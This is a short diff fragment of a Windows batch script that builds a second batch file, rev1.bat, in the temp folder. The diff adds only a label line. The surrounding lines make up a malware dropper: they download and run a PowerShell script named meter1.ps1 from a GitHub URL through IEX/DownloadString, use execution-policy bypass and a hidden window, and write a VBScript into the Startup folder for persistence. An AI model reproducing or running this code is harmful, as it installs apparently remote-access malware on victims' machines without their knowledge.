@@ -7,6 +7,7 @@ cd %temp%
     echo         echo IEX ^^(New-Object System.Net.WebClient^^).DownloadString^^('https://raw.githubusercontent.com/0x2034/meterpreter1/main/meter1.ps1'^^) ^> "%temp%\sh1.ps1" >> "%temp%\rev1.bat"
     echo     ^) >> "%temp%\rev1.bat"
     echo     powershell -ep bypass -WindowStyle Hidden -File "%temp%\sh1.ps1" >> "%temp%\rev1.bat"
+    echo     :check_start_vbs >> "%temp%\rev1.bat"
     echo     if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.vbs" ^( >> "%temp%\rev1.bat"
     echo         echo Do  ^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
     echo         echo    Set objShell = CreateObject^^("WScript.Shell"^^) ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
